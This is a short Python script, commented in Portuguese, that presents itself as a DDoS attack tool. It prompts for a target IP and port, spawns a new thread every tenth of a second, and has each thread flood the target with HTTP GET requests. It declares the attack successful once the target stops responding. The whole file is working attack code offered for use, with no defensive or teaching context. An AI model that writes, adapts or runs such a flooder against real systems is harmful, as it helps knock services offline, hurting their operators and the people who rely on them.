import requests
import threading
import time

# Função para enviar requisição HTTP com tratamento de exceções
def send_request(ip, porta, attack_number):
    url = f"http://{ip}:{porta}"
    try:
        # Enviando requisição HTTP com timeout de 5 segundos
        response = requests.get(url, timeout=5)
        
        # Verificando o código de status da resposta
        if response.status_code == 200:
            print(f"Ataque {attack_number} enviado com sucesso para {ip}:{porta}")
        elif response.status_code == 403:
            print(f"Ataque {attack_number} falhou - Acesso proibido para {ip}:{porta}")
        elif response.status_code == 404:
            print(f"Ataque {attack_number} falhou - Página não encontrada em {ip}:{porta}")
        else:
            print(f"Ataque {attack_number} falhou - Código de status inesperado: {response.status_code}")
    
    except requests.exceptions.Timeout:
        print(f"Ataque {attack_number} falhou para {ip}:{porta} - Erro: Timeout")
    except requests.exceptions.ConnectionError:
        print(f"Ataque {attack_number} falhou para {ip}:{porta} - Erro de conexão")
    except requests.exceptions.RequestException as e:
        print(f"Ataque {attack_number} falhou para {ip}:{porta} - Erro desconhecido: {e}")

# Função para gerenciar o ataque DDoS com múltiplas threads
def ataque_ddos(ip, porta):
    print(f"Iniciando ataque DDoS para {ip}:{porta}...")

    attack_number = 1  # Contador de ataques enviados

    while True:
        try:
            # Enviar várias threads simultaneamente
            thread = threading.Thread(target=send_request, args=(ip, porta, attack_number))
            thread.start()

            # Atraso de 0.1 segundos entre a criação das threads
            time.sleep(0.1)

            # Incrementa o número de ataque
            attack_number += 1

        except Exception as e:
            print(f"Erro inesperado: {e}")
            break

        # Checar se o destino ainda está acessível
        try:
            response = requests.get(f"http://{ip}:{porta}", timeout=5)
            if response.status_code != 200:
                print(f"O destino {ip}:{porta} caiu ou está inacessível. Ataque concluído com sucesso!")
                break
        except requests.exceptions.RequestException:
            print(f"O destino {ip}:{porta} caiu ou está inacessível. Ataque concluído com sucesso!")
            break

    print("Ataque finalizado.")

# Função principal para capturar input do usuário e executar o ataque
def main():
    # Captura do IP e porta de destino
    ip = input("Digite o IP de destino (ex.: 192.168.0.1): ")
    porta = input("Digite a porta de destino (ex.: 80): ")

    # Verificando se a porta é válida
    if not porta.isdigit():
        print("Erro: A porta deve ser um número.")
        return

    porta = int(porta)

    # Chama a função de ataque com as entradas fornecidas
    ataque_ddos(ip, porta)

# Executando o programa
if __name__ == "__main__":
    main()
